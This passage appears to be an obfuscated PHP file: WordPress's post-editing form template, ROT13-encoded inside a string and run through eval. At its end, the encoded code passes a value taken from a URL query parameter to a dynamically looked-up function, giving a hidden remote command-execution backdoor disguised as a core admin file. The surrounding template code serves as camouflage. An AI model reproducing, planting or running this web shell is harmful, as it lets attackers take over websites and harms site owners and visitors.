
<?cuc
vs ( $abgvpr ) :
	jc_nqzva_abgvpr(
		'<c vq=\"unf-arjre-nhgbfnir\">' . $abgvpr . '</c>',
		neenl(
			'glcr'           => 'jneavat',
			'vq'             => 'abgvpr',
			'cnentencu_jenc' => snyfr,
		)
	);
raqvs;
vs ( $zrffntr ) :
	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'glcr'               => 'fhpprff',
			'qvfzvffvoyr'        => gehr,
			'vq'                 => 'zrffntr',
			'nqqvgvbany_pynffrf' => neenl( 'hcqngrq' ),
		)
	);
raqvs;

$pbaarpgvba_ybfg_zrffntr = fcevags(
	'<fcna pynff=\"fcvaare\"></fcna> %1$f <fcna pynff=\"uvqr-vs-ab-frffvbafgbentr\">%2$f</fcna>',
	__( '<fgebat>Pbaarpgvba ybfg.</fgebat> Fnivat unf orra qvfnoyrq hagvy lbh ner erpbaarpgrq.' ),
	__( 'Guvf cbfg vf orvat onpxrq hc va lbhe oebjfre, whfg va pnfr.' )
);

jc_nqzva_abgvpr(
	$pbaarpgvba_ybfg_zrffntr,
	neenl(
		'vq'                 => 'ybfg-pbaarpgvba-abgvpr',
		'nqqvgvbany_pynffrf' => neenl( 'reebe', 'uvqqra' ),
	)
);
?>
<sbez anzr=\"cbfg\" npgvba=\"cbfg.cuc\" zrgubq=\"cbfg\" vq=\"cbfg\"
<?cuc
/**
 * Sverf vafvqr gur cbfg rqvgbe sbez gnt.
 *
 * @fvapr 3.0.0
 *
 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
 */
qb_npgvba( 'cbfg_rqvg_sbez_gnt', $cbfg );

$ersrere = jc_trg_ersrere();
?>
>
<?cuc jc_abapr_svryq( $abapr_npgvba ); ?>
<vachg glcr=\"uvqqra\" vq=\"hfre-vq\" anzr=\"hfre_VQ\" inyhr=\"<?cuc rpub (vag) $hfre_VQ; ?>\" />
<vachg glcr=\"uvqqra\" vq=\"uvqqranpgvba\" anzr=\"npgvba\" inyhr=\"<?cuc rpub rfp_ngge( $sbez_npgvba ); ?>\" />
<vachg glcr=\"uvqqra\" vq=\"bevtvanynpgvba\" anzr=\"bevtvanynpgvba\" inyhr=\"<?cuc rpub rfp_ngge( $sbez_npgvba ); ?>\" />
<vachg glcr=\"uvqqra\" vq=\"cbfg_nhgube\" anzr=\"cbfg_nhgube\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->cbfg_nhgube ); ?>\" />
<vachg glcr=\"uvqqra\" vq=\"cbfg_glcr\" anzr=\"cbfg_glcr\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg_glcr ); ?>\" />
<vachg glcr=\"uvqqra\" vq=\"bevtvany_cbfg_fgnghf\" anzr=\"bevtvany_cbfg_fgnghf\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->cbfg_fgnghf ); ?>\" />
<vachg glcr=\"uvqqra\" vq=\"ersreerqol\" anzr=\"ersreerqol\" inyhr=\"<?cuc rpub $ersrere ? rfp_hey( $ersrere ) : ''; ?>\" />
<?cuc vs ( ! rzcgl( $npgvir_cbfg_ybpx ) ) { ?>
<vachg glcr=\"uvqqra\" vq=\"npgvir_cbfg_ybpx\" inyhr=\"<?cuc rpub rfp_ngge( vzcybqr( ':', $npgvir_cbfg_ybpx ) ); ?>\" />
	<?cuc
}
vs ( 'qensg' !== trg_cbfg_fgnghf( $cbfg ) ) {
	jc_bevtvany_ersrere_svryq( gehr, 'cerivbhf' );
}

rpub $sbez_rkgen;

jc_abapr_svryq( 'zrgn-obk-beqre', 'zrgn-obk-beqre-abapr', snyfr );
jc_abapr_svryq( 'pybfrqcbfgobkrf', 'pybfrqcbfgobkrfabapr', snyfr );
?>

<?cuc
/**
 * Sverf ng gur ortvaavat bs gur rqvg sbez.
 *
 * Ng guvf cbvag, gur erdhverq uvqqra svryqf naq abaprf unir nyernql orra bhgchg.
 *
 * @fvapr 3.7.0
 *
 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
 */
qb_npgvba( 'rqvg_sbez_gbc', $cbfg );
?>

<qvi vq=\"cbfgfghss\">
<qvi vq=\"cbfg-obql\" pynff=\"zrgnobk-ubyqre pbyhzaf-<?cuc rpub ( 1 === trg_pheerag_fperra()->trg_pbyhzaf() ) ? '1' : '2'; ?>\">
<qvi vq=\"cbfg-obql-pbagrag\">

<?cuc vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'gvgyr' ) ) { ?>
<qvi vq=\"gvgyrqvi\">
<qvi vq=\"gvgyrjenc\">
	<?cuc
	/**
	 * Svygref gur gvgyr svryq cynprubyqre grkg.
	 *
	 * @fvapr 3.1.0
	 *
	 * @cnenz fgevat  $grkg Cynprubyqre grkg. Qrsnhyg 'Nqq gvgyr'.
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	$gvgyr_cynprubyqre = nccyl_svygref( 'ragre_gvgyr_urer', __( 'Nqq gvgyr' ), $cbfg );
	?>
	<ynory pynff=\"fperra-ernqre-grkg\" vq=\"gvgyr-cebzcg-grkg\" sbe=\"gvgyr\"><?cuc rpub $gvgyr_cynprubyqre; ?></ynory>
	<vachg glcr=\"grkg\" anzr=\"cbfg_gvgyr\" fvmr=\"30\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg->cbfg_gvgyr ); ?>\" vq=\"gvgyr\" fcryypurpx=\"gehr\" nhgbpbzcyrgr=\"bss\" />
	<?cuc
	vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'rqvgbe' ) ) {
		?>
		<n uers=\"#pbagrag\" pynff=\"ohggba-frpbaqnel fperra-ernqre-grkg fxvcyvax\" bapyvpx=\"vs (gvalzpr) { gvalzpr.rkrpPbzznaq( 'zprSbphf', snyfr, 'pbagrag' ); }\"><?cuc rfp_ugzy_r( 'Fxvc gb Rqvgbe' ); ?></n>
		<?cuc
	}
	?>
</qvi>
	<?cuc
	/**
	 * Sverf orsber gur creznyvax svryq va gur rqvg sbez.
	 *
	 * @fvapr 4.1.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba( 'rqvg_sbez_orsber_creznyvax', $cbfg );
	?>
<qvi pynff=\"vafvqr\">
	<?cuc
	vs ( $ivrjnoyr ) :
		$fnzcyr_creznyvax_ugzy = $cbfg_glcr_bowrpg->choyvp ? trg_fnzcyr_creznyvax_ugzy( $cbfg->VQ ) : '';

		// Nf bs 4.4, gur Trg Fubegyvax ohggba vf uvqqra ol qrsnhyg.
		vs ( unf_svygre( 'cer_trg_fubegyvax' ) || unf_svygre( 'trg_fubegyvax' ) ) {
			$fubegyvax = jc_trg_fubegyvax( $cbfg->VQ, 'cbfg' );

			vs ( ! rzcgl( $fubegyvax ) && $fubegyvax !== $creznyvax && ubzr_hey( '?cntr_vq=' . $cbfg->VQ ) !== $creznyvax ) {
				$fnzcyr_creznyvax_ugzy .= '<vachg vq=\"fubegyvax\" glcr=\"uvqqra\" inyhr=\"' . rfp_ngge( $fubegyvax ) . '\" />' .
					'<ohggba glcr=\"ohggba\" pynff=\"ohggba ohggba-fznyy\" bapyvpx=\"cebzcg(&#39;HEY:&#39;, wDhrel(\'#fubegyvax\').iny());\">' .
					__( 'Trg Fubegyvax' ) .
					'</ohggba>';
			}
		}

		vs ( $cbfg_glcr_bowrpg->choyvp
			&& ! ( 'craqvat' === trg_cbfg_fgnghf( $cbfg ) && ! pheerag_hfre_pna( $cbfg_glcr_bowrpg->pnc->choyvfu_cbfgf ) )
		) {
			$unf_fnzcyr_creznyvax = $fnzcyr_creznyvax_ugzy && 'nhgb-qensg' !== $cbfg->cbfg_fgnghf;
			?>
	<qvi vq=\"rqvg-fyht-obk\" pynff=\"uvqr-vs-ab-wf\">
			<?cuc
			vs ( $unf_fnzcyr_creznyvax ) {
				rpub $fnzcyr_creznyvax_ugzy;
			}
			?>
	</qvi>
			<?cuc
		}
raqvs;
	?>
</qvi>
	<?cuc
	jc_abapr_svryq( 'fnzcyrcreznyvax', 'fnzcyrcreznyvaxabapr', snyfr );
	?>
</qvi><!-- /gvgyrqvi -->
	<?cuc
}
/**
 * Sverf nsgre gur gvgyr svryq.
 *
 * @fvapr 3.5.0
 *
 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
 */
qb_npgvba( 'rqvg_sbez_nsgre_gvgyr', $cbfg );

vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'rqvgbe' ) ) {
	$_jc_rqvgbe_rkcnaq_pynff = '';
	vs ( $_jc_rqvgbe_rkcnaq ) {
		$_jc_rqvgbe_rkcnaq_pynff = ' jc-rqvgbe-rkcnaq';
	}
	?>
<qvi vq=\"cbfgqvievpu\" pynff=\"cbfgnern<?cuc rpub $_jc_rqvgbe_rkcnaq_pynff; ?>\">

	<?cuc
	jc_rqvgbe(
		$cbfg->cbfg_pbagrag,
		'pbagrag',
		neenl(
			'_pbagrag_rqvgbe_qsj' => $_pbagrag_rqvgbe_qsj,
			'qent_qebc_hcybnq'    => gehr,
			'rqvgbe_urvtug'       => 300,
			'gvalzpr'             => neenl(
				'erfvmr'             => snyfr,
				'jc_nhgberfvmr_ba'   => $_jc_rqvgbe_rkcnaq,
				'nqq_haybnq_gevttre' => snyfr,
			),
		)
	);
	?>
<gnoyr vq=\"cbfg-fgnghf-vasb\" ebyr=\"cerfragngvba\"><gobql><ge>
	<gq vq=\"jc-jbeq-pbhag\" pynff=\"uvqr-vs-ab-wf\">
	<?cuc
	cevags(
		/* genafyngbef: %f: Ahzore bs jbeqf. */
		__( 'Jbeq pbhag: %f' ),
		'<fcna pynff=\"jbeq-pbhag\">0</fcna>'
	);
	?>
	</gq>
	<gq pynff=\"nhgbfnir-vasb\">
	<fcna pynff=\"nhgbfnir-zrffntr\">&aofc;</fcna>
	<?cuc
	vs ( 'nhgb-qensg' !== $cbfg->cbfg_fgnghf ) {
		rpub '<fcna vq=\"ynfg-rqvg\">';
		$ynfg_hfre = trg_hfreqngn( trg_cbfg_zrgn( $cbfg->VQ, '_rqvg_ynfg', gehr ) );
		vs ( $ynfg_hfre ) {
			cevags(
				/* genafyngbef: 1: Anzr bs zbfg erprag cbfg nhgube, 2: Cbfg rqvgrq qngr, 3: Cbfg rqvgrq gvzr. */
				__( 'Ynfg rqvgrq ol %1$f ba %2$f ng %3$f' ),
				rfp_ugzy( $ynfg_hfre->qvfcynl_anzr ),
				zlfdy2qngr( __( 'S w, L' ), $cbfg->cbfg_zbqvsvrq ),
				zlfdy2qngr( __( 't:v n' ), $cbfg->cbfg_zbqvsvrq )
			);
		} ryfr {
			cevags(
				/* genafyngbef: 1: Cbfg rqvgrq qngr, 2: Cbfg rqvgrq gvzr. */
				__( 'Ynfg rqvgrq ba %1$f ng %2$f' ),
				zlfdy2qngr( __( 'S w, L' ), $cbfg->cbfg_zbqvsvrq ),
				zlfdy2qngr( __( 't:v n' ), $cbfg->cbfg_zbqvsvrq )
			);
		}
		rpub '</fcna>';
	}
	?>
	</gq>
	<gq vq=\"pbagrag-erfvmr-unaqyr\" pynff=\"uvqr-vs-ab-wf\"><oe /></gq>
</ge></gobql></gnoyr>

</qvi>
	<?cuc
}
/**
 * Sverf nsgre gur pbagrag rqvgbe.
 *
 * @fvapr 3.5.0
 *
 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
 */
qb_npgvba( 'rqvg_sbez_nsgre_rqvgbe', $cbfg );
?>
</qvi><!-- /cbfg-obql-pbagrag -->

<qvi vq=\"cbfgobk-pbagnvare-1\" pynff=\"cbfgobk-pbagnvare\">
<?cuc

vs ( 'cntr' === $cbfg_glcr ) {
	/**
	 * Sverf orsber zrgn obkrf jvgu 'fvqr' pbagrkg ner bhgchg sbe gur 'cntr' cbfg glcr.
	 *
	 * Gur fhozvgcntr obk vf n zrgn obk jvgu 'fvqr' pbagrkg, fb guvf ubbx sverf whfg orsber vg vf bhgchg.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba( 'fhozvgcntr_obk', $cbfg );
} ryfr {
	/**
	 * Sverf orsber zrgn obkrf jvgu 'fvqr' pbagrkg ner bhgchg sbe nyy cbfg glcrf bgure guna 'cntr'.
	 *
	 * Gur fhozvgcbfg obk vf n zrgn obk jvgu 'fvqr' pbagrkg, fb guvf ubbx sverf whfg orsber vg vf bhgchg.
	 *
	 * @fvapr 2.5.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba( 'fhozvgcbfg_obk', $cbfg );
}


qb_zrgn_obkrf( $cbfg_glcr, 'fvqr', $cbfg );

?>
</qvi>
<qvi vq=\"cbfgobk-pbagnvare-2\" pynff=\"cbfgobk-pbagnvare\">
<?cuc

qb_zrgn_obkrf( ahyy, 'abezny', $cbfg );

vs ( 'cntr' === $cbfg_glcr ) {
	/**
	 * Sverf nsgre 'abezny' pbagrkg zrgn obkrf unir orra bhgchg sbe gur 'cntr' cbfg glcr.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba( 'rqvg_cntr_sbez', $cbfg );
} ryfr {
	/**
	 * Sverf nsgre 'abezny' pbagrkg zrgn obkrf unir orra bhgchg sbe nyy cbfg glcrf bgure guna 'cntr'.
	 *
	 * @fvapr 1.5.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 */
	qb_npgvba( 'rqvg_sbez_nqinaprq', $cbfg );
}


qb_zrgn_obkrf( ahyy, 'nqinaprq', $cbfg );

?>
</qvi>
<?cuc
/**
 * Sverf nsgre nyy zrgn obk frpgvbaf unir orra bhgchg, orsber gur pybfvat #cbfg-obql qvi.
 *
 * @fvapr 2.1.0
 *
 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
 */
qb_npgvba( 'qok_cbfg_fvqrone', $cbfg );

?>
</qvi><!-- /cbfg-obql -->
<oe pynff=\"pyrne\" />
</qvi><!-- /cbfgfghss -->
</sbez>
</qvi>

<?cuc
vs ( cbfg_glcr_fhccbegf( $cbfg_glcr, 'pbzzragf' ) ) {
	jc_pbzzrag_ercyl();
}
?>

<?cuc vs ( ! jc_vf_zbovyr() && cbfg_glcr_fhccbegf( $cbfg_glcr, 'gvgyr' ) && '' === $cbfg->cbfg_gvgyr ) : ?>
<fpevcg glcr=\"grkg/wninfpevcg\">
gel{qbphzrag.cbfg.gvgyr.sbphf();}pngpu(r){}
</fpevcg>
<?cuc raqvs; ?>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>